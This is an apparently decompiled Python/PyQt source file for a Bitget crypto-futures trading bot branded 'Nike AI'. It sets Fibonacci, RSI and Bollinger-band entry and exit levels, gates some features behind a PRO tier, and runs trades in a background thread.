        self.tail_label.setVisible(not ex)
        self.tail_slider.setVisible(not ex)

    def setup_comboboxes(self):
        if extension:
            if extension:
                if PRO:
                    img = 'IMG/back2.png'
               
                if img == None:
                    img = 'NIKE/IMG/back2.png'
                self.log_output.setStyleSheet(f'\n                background-image: url({img});\n                background-repeat: repeat-y;\n                color: yellow;\n                line-height: 1; font-size: 11pt;\n            ')
                # tail_image_path = 'IMG/Tale/level1.png'
                # self.tail_image_pixmap = QPixmap(tail_image_path)
                # img = 'IMG/back2.png'
                # self.log_output.setStyleSheet(f'\n                    background-image: url({img});\n                    background-repeat: repeat-y;\n                    color: yellow;\n                    line-height: 1; font-size: 11pt;\n                ')
                # image_path = 'IMG/extension_trade_type.png'
                # self.image_pixmap = QPixmap(image_path)
                # if not self.image_pixmap.isNull():
                #     self.image_label.setPixmap(self.image_pixmap.scaled(600, 600, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                #     self.image_label.resize(self.tail_image_pixmap.size())
                tail_image_path = 'IMG/Tale/notale.png'
                self.tail_image_pixmap = QPixmap(tail_image_path)
                if not self.tail_image_pixmap.isNull():
                    self.tail_image_label.setPixmap(self.tail_image_pixmap.scaled(600, 600, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                    self.tail_image_label.resize(self.tail_image_pixmap.size())
        else:  
            # self.update_image()
            self.update_chart_tail(chart_tail)
            if PRO:
                img = 'IMG/back3.png'
           
            if img == None:
                img = 'NIKE/IMG/back3.png'
            self.log_output.setStyleSheet(f'\n                background-image: url({img});\n                background-repeat: repeat-y;\n                color: yellow;\n                line-height: 1; font-size: 11pt;\n            ')
            tail_image_path = 'IMG/Tale/tail1.png'
            self.tail_image_pixmap = QPixmap(tail_image_path)
            if not self.tail_image_pixmap.isNull():
                self.tail_image_label.setPixmap(self.tail_image_pixmap.scaled(600, 600, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                self.tail_image_label.resize(self.tail_image_pixmap.size())
        for i in reversed(range(self.combobox_layout.count())):
            widget = self.combobox_layout.itemAt(i).widget()
            if widget is not None:
                widget.deleteLater()
        if not extension:
            self.label1 = QLabel('Entry Price', self)
            self.label1.setStyleSheet('color: white;')
            self.combobox1 = QComboBox(self)
            self.combobox1.addItems(['Fibonacci 0.13(risk)', 'Fibonacci 0.236(Recommend)'])
            self.combobox1.currentIndexChanged.connect(self.update_fibo)
            self.combobox_layout.addWidget(self.label1)
            self.combobox_layout.addWidget(self.combobox1)
            self.label2 = QLabel('TP Price', self)
            self.label2.setStyleSheet('color: white;')
            self.combobox2 = QComboBox(self)
            self.combobox2.addItems(['Fibonacci 0.5', 'Fibonacci 0.618'])
            self.combobox2.currentIndexChanged.connect(self.update_TP)
            self.combobox_layout.addWidget(self.label2)
            self.combobox_layout.addWidget(self.combobox2)
            self.label3 = QLabel('SL Price', self)
            self.label3.setStyleSheet('color: white;')
            self.combobox3 = QComboBox(self)
            self.combobox3.addItems(['Fibonacci 0', 'Fibonacci -0.13'])
            self.combobox3.currentIndexChanged.connect(self.update_SL)
            self.combobox_layout.addWidget(self.label3)
            self.combobox_layout.addWidget(self.combobox3)
        else:  
            self.label2 = QLabel('Trend Extension TP Price', self)
            self.label2.setStyleSheet('color: white;')
            self.combobox2 = QComboBox(self)
            self.combobox2.addItems(['Fibonacci 1.13', 'Fibonacci 1.236(Recommend)', 'Fibonacci 1.5'])
            self.combobox2.currentIndexChanged.connect(self.update_TP_extension)
            self.combobox_layout.addWidget(self.label2)
            self.combobox_layout.addWidget(self.combobox2)
            self.label3 = QLabel('Trend Extension SL Price', self)
            self.label3.setStyleSheet('color: white;')
            self.combobox3 = QComboBox(self)
            self.combobox3.addItems(['Fibonacci 0.618', 'Fibonacci 0.5', 'Fibonacci 0.382'])
            self.combobox3.currentIndexChanged.connect(self.update_SL_extension)
            self.combobox_layout.addWidget(self.label3)
            self.combobox_layout.addWidget(self.combobox3)

    def resizeEvent(self, event):
        window_width = self.width()
        window_height = self.height()
        scaled_pixmap = self.pixmap.scaled(window_width, window_height, Qt.IgnoreAspectRatio, Qt.SmoothTransformation)
        self.label.setPixmap(scaled_pixmap)
        self.label.setGeometry(0, 0, window_width, window_height)
        super().resizeEvent(event)

    def connect_pro(self):
        if not PRO:
            self.BasicPro_window = BasicProWindow()
            self.BasicPro_window.exec_()

 

    def clear_log_output(self):
        self.log_output.clear()

    def handle_resolution_change(self):
        screen = QApplication.primaryScreen()
        screen_size = screen.size()
        screen_width, screen_height = (screen_size.width(), screen_size.height())
        self.resize(int(screen_width * 0.8), int(screen_height * 0.8))
        font_size = int(screen_height * 0.03)
        self.label.setFont(QFont('Arial', font_size))

    # def update_image(self):
    #     global Trade_Level  
    #     global autotrade_type  
    #     if extension:
    #         image_path = 'IMG/trade_blur.png'
    #     else:  
    #         if entry_price == 1 and TP_price == 0 and (SL_price == 0):
    #             if PRO:
    #                 image_path = 'IMG/PRO/tradeA.png'
    #             else:  
    #                 image_path = 'IMG/trade_blur.png'
    #             Trade_Level = {'A': 1, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0}
    #             autotrade_type = 'A'
    #         else:  
    #             if entry_price == 1 and TP_price == 1 and (SL_price == 0):
    #                 if PRO:
    #                     image_path = 'IMG/PRO/tradeB.png'
    #                 else:  
    #                     image_path = 'IMG/trade_blur.png'
    #                 Trade_Level = {'A': 0, 'B': 1, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0}
    #                 autotrade_type = 'B'
    #             else:  
    #                 if entry_price == 1 and TP_price == 0 and (SL_price == 1):
    #                     if PRO:
    #                         image_path = 'IMG/PRO/tradeC.png'
    #                     else:  
    #                         image_path = 'IMG/trade_blur.png'
    #                     Trade_Level = {'A': 0, 'B': 0, 'C': 1, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0}
    #                     autotrade_type = 'C'
    #                 else:  
    #                     if entry_price == 1 and TP_price == 1 and (SL_price == 1):
    #                         if PRO:
    #                             image_path = 'IMG/PRO/tradeD.png'
    #                         else:  
    #                             image_path = 'IMG/trade_blur.png'
    #                         Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 1, 'E': 0, 'F': 0, 'G': 0, 'H': 0}
    #                         autotrade_type = 'D'
    #                     else:  
    #                         if entry_price == 0 and TP_price == 0 and (SL_price == 0):
    #                             if PRO:
    #                                 image_path = 'IMG/PRO/tradeE.png'
    #                             else:  
    #                                 image_path = 'IMG/trade_blur.png'
    #                             Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 1, 'F': 0, 'G': 0, 'H': 0}
    #                             autotrade_type = 'E'
    #                         else:  
    #                             if entry_price == 0 and TP_price == 1 and (SL_price == 0):
    #                                 if PRO:
    #                                     image_path = 'IMG/PRO/tradeF.png'
    #                                 else:  
    #                                     image_path = 'IMG/trade_blur.png'
    #                                 Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 1, 'G': 0, 'H': 0}
    #                                 autotrade_type = 'F'
    #                             else:  
    #                                 if entry_price == 0 and TP_price == 0 and (SL_price == 1):
    #                                     if PRO:
    #                                         image_path = 'IMG/PRO/tradeG.png'
    #                                     else:  
    #                                         image_path = 'IMG/trade_blur.png'
    #                                     Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 1, 'H': 0}
    #                                     autotrade_type = 'G'
    #                                 else:  
    #                                     if entry_price == 0 and TP_price == 1 and (SL_price == 1):
    #                                         if PRO:
    #                                             image_path = 'IMG/PRO/tradeH.png'
    #                                         else:  
    #                                             image_path = 'IMG/trade_blur.png'
    #                                         Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 1}
    #                                         autotrade_type = 'H'
    #                                     else:  
    #                                         return None
    #     self.update_state(autotrade_type)
    #     self.image_pixmap = QPixmap(image_path)
    #     if not self.image_pixmap.isNull():
    #         self.image_label.setPixmap(self.image_pixmap.scaled(600, 600, Qt.KeepAspectRatio, Qt.SmoothTransformation))
    #         self.image_label.resize(self.tail_image_pixmap.size())

    def update_image_extension(self):
        global Trade_Level  
        global autotrade_type  
        if TP_price_ex == 0 and SL_price == 0:
            image_path = 'IMG/extension_trade_type.png'
            Trade_Level = {'A': 1, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0}
            autotrade_type = 'A'
        else:  
            if TP_price == 0 and SL_price == 1:
                image_path = 'IMG/extension_trade_type.png'
                Trade_Level = {'A': 0, 'B': 1, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0}
                autotrade_type = 'B'
            else:  
                if TP_price == 0 and SL_price == 2:
                    image_path = 'IMG/extension_trade_type.png'
                    Trade_Level = {'A': 0, 'B': 0, 'C': 1, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0}
                    autotrade_type = 'C'
                else:  
                    if TP_price == 1 and SL_price == 0:
                        image_path = 'IMG/extension_trade_type.png'
                        Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 1, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0}
                        autotrade_type = 'D'
                    else:  
                        if TP_price == 1 and SL_price == 1:
                            image_path = 'IMG/extension_trade_type.png'
                            Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 1, 'F': 0, 'G': 0, 'H': 0, 'I': 0}
                            autotrade_type = 'E'
                        else:  
                            if TP_price == 1 and SL_price == 2:
                                image_path = 'IMG/extension_trade_type.png'
                                Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 1, 'G': 0, 'H': 0, 'I': 0}
                                autotrade_type = 'F'
                            else:  
                                if TP_price == 2 and SL_price == 0:
                                    image_path = 'IMG/extension_trade_type.png'
                                    Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 1, 'H': 0, 'I': 0}
                                    autotrade_type = 'G'
                                else:  
                                    if TP_price == 2 and SL_price == 1:
                                        image_path = 'IMG/extension_trade_type.png'
                                        Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 1, 'I': 0}
                                        autotrade_type = 'H'
                                    else:  
                                        if TP_price == 2 and SL_price == 2:
                                            image_path = 'IMG/extension_trade_type.png'
                                            Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 1}
                                            autotrade_type = 'I'
                                        else:  
                                            return None
        self.update_state(autotrade_type)
        self.image_pixmap = QPixmap(image_path)
        if not self.image_pixmap.isNull():
            self.image_label.setPixmap(self.image_pixmap.scaled(600, 600, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            self.image_label.resize(self.tail_image_pixmap.size())

    def handle_mouse_move(self, event):
        if not PRO:
            if 0 <= event.x() <= self.image_label.width() and 0 <= event.y() <= self.image_label.height():
                self.setCursor(QCursor(Qt.PointingHandCursor))
            else:  
                self.setCursor(QCursor(Qt.ArrowCursor))

    def handle_mouse_click(self, event):
        if not PRO and event.button() == Qt.LeftButton:
            self.BasicPro_window = BasicProWindow()
            self.BasicPro_window.exec_()

    def update_fibo(self, index):
        global entry_price  
        if index == 0:
            entry_price = 0
        else:  
            entry_price = 1
        # self.update_image()

    def update_TP(self, index):
        global TP_price  
        if index == 0:
            TP_price = 0
        else:  
            TP_price = 1
        # self.update_image()

    def update_SL(self, index):
        global SL_price  
        if index == 0:
            SL_price = 0
        else:  
            SL_price = 1
        # self.update_image()

    def update_TP_extension(self, index):
        global TP_price_ex  
        if index == 0:
            TP_price_ex = 0
        else:  
            if index == 1:
                TP_price_ex = 1
            else:  
                TP_price_ex = 2
        self.update_image_extension()

    def update_SL_extension(self, index):
        global SL_price_ex  
        if index == 0:
            SL_price_ex = 0
        else:  
            if index == 1:
                SL_price_ex = 1
            else:  
                SL_price_ex = 2
        self.update_image_extension()

    def update_bitget_symbol(self):
        global bitget_symbol  
        selected_symbol = self.combo_box.currentText()
        bitget_symbol = symbol_df[symbol_df['symbolDisplayName'] == selected_symbol]['symbol'].values[0]
        self.select_symbol_label.setText(f'Selected Symbol: {selected_symbol} (Symbol: {bitget_symbol})')

    def toggle_long_checkbox(self, state):
        global excute_only_long  
        if state == Qt.Checked:
            excute_only_long = True
        else:  
            excute_only_long = False

    def toggle_short_checkbox(self, state):
        global excute_only_short  
        if state == Qt.Checked:
            excute_only_short = True
        else:  
            excute_only_short = False

    def diverence_reset_prevent_toggle(self):
        self.diverence_prevent_toggle = False

    def toggle_diverence_checkbox(self, state):
        global diverence_request  
        if state == Qt.Checked:
            if PRO:
                diverence_request = True
            else:  
                self.BasicPro_window = BasicProWindow()
                self.BasicPro_window.exec_()
                diverence_request = False
                self.diverence_prevent_toggle = True
                self.diverence_checkbox.setChecked(False)
                self.diverence_checkbox.setEnabled(False)
                QTimer.singleShot(1000, self.diverence_reset_prevent_toggle)
        else:  
            diverence_request = False
            self.diverence_checkbox.setChecked(False)

    def bollinger_reset_prevent_toggle(self):
        self.bollinger_prevent_toggle = False

    def toggle_bollinger_checkbox(self, state):
        global oneway_protect  
        if state == Qt.Checked:
            if PRO:
                oneway_protect = True
            else:  
                self.BasicPro_window = BasicProWindow()
                self.BasicPro_window.exec_()
                oneway_protect = False
                self.bollinger_prevent_toggle = True
                self.bollinger_checkbox.setChecked(False)
                self.bollinger_checkbox.setEnabled(False)
                QTimer.singleShot(1000, self.bollinger_reset_prevent_toggle)
        else:  
            oneway_protect = False
            self.bollinger_checkbox.setChecked(False)

    def toggle_lowtail_checkbox(self, state):
        global tail_strategy  
        if state == Qt.Checked:
            tail_strategy = True
        else:  
            tail_strategy = False

    def update_trading_error(self, value):
        global trading_error  
        trading_error = value
        self.trade_error_label.setText(f'Fibonacci Positon Tolerance : {value}')

    def update_long_rsi(self, value):
        
        global long_rsi_value  
        long_rsi_value = value
        self.long_rsi_label.setText(f'Long RSI: Enter Positon below {value}')

    def update_short_rsi(self, value):
        
        global short_rsi_value  
        short_rsi_value = value
        self.short_rsi_label.setText(f'Short RSI: Enter Positon above {value}')

    def update_chart_tail(self, value):
        global chart_tail  
        global fibo_value  
        if extension:
            tail_image_path = 'IMG/Tale/tail1.png'
        if PRO:
            chart_tail = value
            if chart_tail == 0:
                tail_image_path = 'IMG/Tale/tail1.png'
                fibo_value = 0
            else:  
                if chart_tail == 1:
                    tail_image_path = 'IMG/Tale/tail2.png'
                    fibo_value = 0.03
                else:  
                    if chart_tail == 2:
                        tail_image_path = 'IMG/Tale/tail3.png'
                        fibo_value = 0.05
                    else:  
                        if chart_tail == 3:
                            tail_image_path = 'IMG/Tale/tail4.png'
                            fibo_value = 0.1
                        else:  
                            if chart_tail == 4:
                                tail_image_path = 'IMG/Tale/tail5.png'
                                fibo_value = 0.13
                            else:  
                                if chart_tail == 5:
                                    tail_image_path = 'IMG/Tale/tail6.png'
                                    fibo_value = 0.15
                                else:  
                                    if chart_tail == 6:
                                        tail_image_path = 'IMG/Tale/tail7.png'
                                        fibo_value = 0.18
                                    else:  
                                        if chart_tail == 7:
                                            tail_image_path = 'IMG/Tale/tail8.png'
                                            fibo_value = 0.2
                                        else:  
                                            if chart_tail == 8:
                                                tail_image_path = 'IMG/Tale/tail9.png'
                                                fibo_value = 0.236
                                            else:  
                                                fibo_value = 0.236
            self.tail_label.setText(f'Top/Bottom Tail Step (Fibo) : {value} ({fibo_value})')
            self.tail_label
        self.tail_image_pixmap = QPixmap(tail_image_path)
        if not self.tail_image_pixmap.isNull():
            self.tail_image_label.setPixmap(self.tail_image_pixmap.scaled(600, 600, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            self.tail_image_label.resize(self.tail_image_pixmap.size())

    def update_state(self, value):
        global autotrade_type  
        autotrade_type = value

    

    def resizeEvent(self, event):
        new_size = event.size()
        super(MainWindow, self).resizeEvent(event)

    

    def stop_autotrade(self):
        global autotrade_type  
        global stop_autotrade  
        global is_trading_active  
        global autotrade_thread  
        autotrade_type = ''
        if not is_trading_active:
            QMessageBox.warning(self, 'Warning', 'No AI trades are currently running.')
            return
        stop_autotrade = True
        if autotrade_thread is not None or autotrade_thread.is_alive():
            terminate_thread(autotrade_thread)
            autotrade_thread = None
            is_trading_active = False
            print('Stopping AI trading. Please wait a moment...')
        else:  
            print('Stopping AI trading. Please wait a moment...')
            print('If you continue to see this message, please close the program completely')

    def USDT2BTC(self, bitget, leverage, trade_size):
        market_price = float(bitget.mix_get_market_price(symbol=bitget_symbol)['data']['markPrice'])
        btc_amount = 0
        btc_amount = float(trade_size) * float(leverage) / market_price
        return str(round(btc_amount, 3))

    def closeEvent(self, event):
        
        
        os.kill(os.getpid(), signal.SIGTERM)
        
       

    class RedirectText:
        def __init__(self, text_widget, clear_log_callback):
            self.text_widget = text_widget
            self.clear_log_callback = clear_log_callback

        def write(self, string):
            self.text_widget.append(string)
            time.sleep(0.2)
            self.text_widget.moveCursor(QTextCursor.End)

        def flush(self):
            return

        def clear_log(self):
            self.clear_log_callback()

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self.background_label.resize(self.size())

    def start_autotrade(self):
        global stop_autotrade  
        global is_trading_active  
        global autotrade_thread  
        try:
            trade_size = 0
            if is_trading_active:
                QMessageBox.warning(self, 'Warning', 'AI Trading is already running.')
                return
            self.update_state(autotrade_type)
            print('AI is waiting for chart conditions to be met...')
            trade_size = self.trade_size_input.text()
            leverage = self.leverage_size_input.text()
            if not bitget:
                QMessageBox.critical(self, 'Error', 'Invalid API key. Please enter it again.')
                return
            bitget.mix_adjust_leverage(symbol=bitget_symbol, marginCoin='USDT', leverage=leverage, holdSide=None)
            trade_size = self.USDT2BTC(bitget, leverage, trade_size)
            print('Position Entry Amount (BTC) : ', trade_size)
            if not bitget:
                QMessageBox.critical(self, 'Error', 'Invalid API key. Please enter it again.')
                return
            balances = float(bitget.mix_get_accounts(productType='umcbl')['data'][0]['available'])
            print('USDT available to order :', balances)
            QMessageBox.information(self, 'Nike AI', 'Nike AI trading has launched.')
            stop_autotrade = False
            is_trading_active = True
            autotrade_thread = threading.Thread(target=schedule_autotrade, args=(bitget, trade_size, self))
            autotrade_thread.start()
        except Exception as e:
            print(f'Error while AI Trading: {e}')


def get_current_status(bitget):
    try:
        balances = bitget.mix_get_accounts(productType='umcbl')['data']
        BTC_balance = 0
        for b in balances:
            if b['marginCoin'] == 'BTC':
                BTC_balance = float(b['available'])
            if b['marginCoin'] == 'USDT':
                USDT_balance = float(b['available'])
        positions = bitget.mix_get_single_position(symbol=bitget_symbol, marginCoin='USDT')['data']
        current_status = {'USDT Balance': USDT_balance, 'positions': positions}
    except Exception as e:
        print(f'Error fetching current balance {e}')
    return current_status

def fetch_and_prepare_data(bitget):
    try:
        end_time = int(time.time()) * 1000
        start_time_daily = end_time - 45000000
        # llog(start_time_daily)
        # llog(end_time)
        
        fiftymin_data = bitget.mix_get_candles(symbol=bitget_symbol, granularity='15m', startTime=start_time_daily, endTime=end_time)
        df_fiftymin = pd.DataFrame(fiftymin_data, columns=['timestamp', 'open', 'high', 'low', 'close', 'volume', 'ignore'])
        df_fiftymin = df_fiftymin.apply(pd.to_numeric, errors='coerce')
        # llog(df_fiftymin)
        
        
    except Exception as e:
        print(f'Failed to load 15-minute chart data: {e}')

    def add_indicators(df):
        global fibo_error2  
        global fibo_0013  
        global fibo_0180  
        global fibo_0800  
        global fibo_0030  
        global fibo_0764  
        global fibo_0100  
        global fibo_error  
        global fibo_0130  
        global fibo_0000  
        global fibo_0382  
        global fibo_1000  
        global fibo_0150  
        global fibo_0850  
        global fibo_Minus013  
        global fibo_0900  
        global fibo_0236  
        global fibo_1130  
        global fibo_0970  
        global fibo_0820  
        global fibo_0050  
        global fibo_0500  
        global leave_bus  
        global fibo_0950  
        global fibo_0870  
        global div  
        global fibo_0200  
        global fibo_0618  
        try:
            fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = fibo_1000 = fibo_Minus013 = fibo_1130 = 0
            fibo_0030 = fibo_0050 = fibo_0100 = fibo_0013 = fibo_0150 = fibo_0180 = fibo_0200 = 0
            fibo_0970 = fibo_0950 = fibo_0900 = fibo_0850 = fibo_0820 = fibo_0800 = 0
            if extension:
                return (0, 0, 0)
            upper_high = 0
            lower_low = 0
            up_first = False
            low_first = False
            lower_idx = (-1)
            upper_idx = (-1)
            risk_up_idx = []
            risk_down_idx = []
            elite_up_idx = []
            elite_low_idx = []
            post_lower_df = []
            post_upper_df = []
            up_tail = [0, 0]
            low_tail = [0, 0]
            up_tail_per = 0
            low_tail_per = 0
            chart_fibo_per = False
            diverence_rsi_last = (-1)
            diverence_rsi_first = (-1)
            first_price = (-1)
            tail = 0
            previous_upper_df = pd.DataFrame()
            previous_lower_df = pd.DataFrame()
            recent_lower_df = pd.DataFrame()
            recent_upper_df = pd.DataFrame()
            df['RSI_14'] = ta.rsi(df['close'], length=16)
            df['Middle_Band'] = df['close'].rolling(window=20).mean()
            std_dev = df['close'].rolling(window=20).std()
            df['Upper_Band'] = round(df['Middle_Band'] + std_dev * 2, 1)
            df['Lower_Band'] = round(df['Middle_Band'] - std_dev * 2, 1)
            df['PlusTrue/MinusFalse'] = df['open'] < df['close']
            df['Candle_break_Upperband'] = df['high'] > df['Upper_Band']
            df['Candle_break_Lowerband'] = df['low'] < df['Lower_Band']
            df['Upperband_group'] = (df['Candle_break_Upperband']!= df['Candle_break_Upperband'].shift(1)).cumsum() * df['Candle_break_Upperband']
            df['Lowerband_group'] = (df['Candle_break_Lowerband']!= df['Candle_break_Lowerband'].shift(1)).cumsum() * df['Candle_break_Lowerband']
            upperband_groups = df[df['Upperband_group'] > 0]['Upperband_group'].unique()
            lowerband_groups = df[df['Lowerband_group'] > 0]['Lowerband_group'].unique()
            upperband_first_idx = df[df['Candle_break_Upperband'] == True].index.max() if not df[df['Candle_break_Upperband']].empty else None
            lowerband_first_idx = df[df['Candle_break_Lowerband'] == True].index.max() if not df[df['Candle_break_Lowerband']].empty else None

           
            #llog(df)
          
            if upperband_first_idx is not None and (lowerband_first_idx is None or upperband_first_idx > lowerband_first_idx):
                up_first = True
                if len(upperband_groups) > 0:
                    recent_upper_group = upperband_groups[(-1)]
                    recent_upper_df = df[df['Upperband_group'] == recent_upper_group]
                    if not recent_upper_df.empty:
                        upper_high = recent_upper_df['high'].max()
                        diverence_rsi_last = recent_upper_df['RSI_14'].max()
                    if len(upperband_groups) > 1:
                        previous_upper_group = upperband_groups[(-2)]
                        if previous_upper_group is not None:
                            previous_upper_df = df[df['Upperband_group'] == previous_upper_group]
                            if not previous_upper_df.empty and abs(recent_upper_df.index[0] - previous_upper_df.index[(-1)]) <= 5:
                                combined_upper_df = pd.concat([recent_upper_df, previous_upper_df])
                                if not combined_upper_df.empty:
                                    upper_high = combined_upper_df['high'].max()
                        diverence_rsi_first = previous_upper_df['RSI_14'].max()
                        if not previous_upper_df.empty:
                            first_price = previous_upper_df['high'].max()
                if len(lowerband_groups) > 0:
                    recent_lower_group = lowerband_groups[(-1)]
                    recent_lower_df = df[df['Lowerband_group'] == recent_lower_group]
                    if not recent_lower_df.empty:
                        lower_low = recent_lower_df['low'].min()
                    if len(lowerband_groups) > 1:
                        previous_lower_group = lowerband_groups[(-2)]
                        if previous_lower_group is not None:
                            previous_lower_df = df[df['Lowerband_group'] == previous_lower_group]
                            if not previous_lower_df.empty and abs(recent_lower_df.index[0] - previous_lower_df.index[(-1)]) <= 5:
                                combined_lower_df = pd.concat([recent_lower_df, previous_lower_df])
                                if not combined_lower_df.empty:
                                    lower_low = combined_lower_df['low'].min()
                else:  
                    lower_low = df['low'].min()
            else:  
                if lowerband_first_idx is not None:
                    if upperband_first_idx is None or lowerband_first_idx > upperband_first_idx:
                        low_first = True
                        if len(lowerband_groups) > 0:
                            recent_lower_group = lowerband_groups[(-1)]
                            recent_lower_df = df[df['Lowerband_group'] == recent_lower_group]
                            if not recent_lower_df.empty:
                                lower_low = recent_lower_df['low'].min()
                            diverence_rsi_last = recent_lower_df['RSI_14'].min()
                            if len(lowerband_groups) > 1:
                                previous_lower_group = lowerband_groups[(-2)]
                                if previous_lower_group is not None:
                                    previous_lower_df = df[df['Lowerband_group'] == previous_lower_group]
                                    if not previous_lower_df.empty and abs(recent_lower_df.index[0] - previous_lower_df.index[(-1)]) <= 5:
                                        combined_lower_df = pd.concat([recent_lower_df, previous_lower_df])
                                        if not combined_lower_df.empty:
                                            lower_low = combined_lower_df['low'].min()
                                diverence_rsi_first = previous_lower_df['RSI_14'].min()
                                if not previous_upper_df.empty:
                                    first_price = previous_upper_df['low'].min()
                        if len(upperband_groups) > 0:
                            recent_upper_group = upperband_groups[(-1)]
                            recent_upper_df = df[df['Upperband_group'] == recent_upper_group]
                            if not recent_upper_df.empty:
                                upper_high = recent_upper_df['high'].max()
                            if len(upperband_groups) > 1:
                                previous_upper_group = upperband_groups[(-2)]
                                if previous_upper_group is not None:
                                    previous_upper_df = df[df['Upperband_group'] == previous_upper_group]
                                    if not previous_upper_df.empty and abs(recent_upper_df.index[0] - previous_upper_df.index[(-1)]) <= 5:
                                        combined_upper_df = pd.concat([recent_upper_df, previous_upper_df])
                                        if not combined_upper_df.empty:
                                            upper_high = combined_upper_df['high'].max()
                        else:  
                            upper_high = df['high'].max()
            if upper_high > lower_low:
                fibo_0000 = round(lower_low, 1) + trading_error
                fibo_0130 = round(lower_low + 0.138 * (upper_high - lower_low), 1) + trading_error
                fibo_0236 = round(lower_low + 0.236 * (upper_high - lower_low), 1) + trading_error
                fibo_0382 = round(lower_low + 0.382 * (upper_high - lower_low), 1) + trading_error
                fibo_0500 = round(lower_low + 0.5 * (upper_high - lower_low), 1) + trading_error
                fibo_0618 = round(lower_low + 0.618 * (upper_high - lower_low), 1) + trading_error
                fibo_0764 = round(lower_low + 0.764 * (upper_high - lower_low), 1) + trading_error
                fibo_0870 = round(lower_low + 0.87 * (upper_high - lower_low), 1) + trading_error
                fibo_1000 = round(upper_high, 1) + trading_error
                fibo_Minus013 = round(lower_low + (-0.135) * (upper_high - lower_low), 1) + trading_error
                fibo_1130 = round(lower_low + 1.135 * (upper_high - lower_low), 1) + trading_error
                if PRO:
                    fibo_0030 = round(lower_low + 0.03 * (upper_high - lower_low), 1) + trading_error
                    fibo_0050 = round(lower_low + 0.05 * (upper_high - lower_low), 1) + trading_error
                    fibo_0100 = round(lower_low + 0.1 * (upper_high - lower_low), 1) + trading_error
                    fibo_0015 = round(lower_low + 0.15 * (upper_high - lower_low), 1) + trading_error
                    fibo_0180 = round(lower_low + 0.18 * (upper_high - lower_low), 1) + trading_error
                    fibo_0200 = round(lower_low + 0.2 * (upper_high - lower_low), 1) + trading_error
                    fibo_0970 = round(lower_low + 0.97 * (upper_high - lower_low), 1) + trading_error
                    fibo_0950 = round(lower_low + 0.95 * (upper_high - lower_low), 1) + trading_error
                    fibo_0900 = round(lower_low + 0.9 * (upper_high - lower_low), 1) + trading_error
                    fibo_0850 = round(lower_low + 0.85 * (upper_high - lower_low), 1) + trading_error
                    fibo_0820 = round(lower_low + 0.82 * (upper_high - lower_low), 1) + trading_error
                    fibo_0800 = round(lower_low + 0.8 * (upper_high - lower_low), 1) + trading_error
                percentage_change = (fibo_1000 - fibo_0000) / fibo_0000 * 100
                if abs(percentage_change) >= 5:
                    chart_fibo_per = True
                else:  
                    chart_fibo_per = False
            fib_gap = fibo_1000 - fibo_0000
            upper_idx = df[df['high'] == upper_high].index
            lower_idx = df[df['low'] == lower_low].index
            print("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------           ")
            print(f"Start : {convert_timestamp_to_time(df.loc[df.index[0], 'timestamp'])} \
                End   : {convert_timestamp_to_time(df.loc[df.index[-1], 'timestamp'])} \
                Top : {convert_timestamp_to_time(df.loc[upper_idx[0], 'timestamp'])} \
                Bottom : {convert_timestamp_to_time(df.loc[lower_idx[0], 'timestamp'])}", end=" ")
            
            if up_first == True:
                if diverence_request == True and len(upper_idx) > 0:
                    if diverence_rsi_last - diverence_rsi_first > 0 and fibo_1000 - first_price < 0:
                        div = True
                    else:  
                        if diverence_rsi_last - diverence_rsi_first < 0 and fibo_1000 - first_price > 0:
                            div = True
                        else:  
                            div = False
                if len(upper_idx) > 0:
                    post_upper_df = df.loc[upper_idx[0]:]
                if diverence_request == True:
                    if div == True:
                        pass
                    else:  
                        print("Diverence Check Failed")
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                if oneway_protect == True and len(df) > 0 and (fibo_0500!= 0):
                    latest_lower_band = df.loc[df.index[(-1)], 'Lower_Band']
                    if fibo_0500 < latest_lower_band:
                        print("Oneway_protect")
                        fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                        fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                        fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                if not tail_strategy == True or not len(lower_idx) > 0 or df.loc[lower_idx[0], 'Candle_break_Lowerband'] == True:
                    pass
                else:  
                    print("Tail_strategy : LowerCandle")
                    
                    fibo_0000 = fibo_0130 = fibo_0236 = fibo_0382 = 0
                    fibo_0500 = fibo_0618 = fibo_0764 = fibo_0870 = 0
                    fibo_1000 = fibo_Minus013 = fibo_1130 = 0
                if len(upper_idx) > 0:
                    if fibo_value == 0:
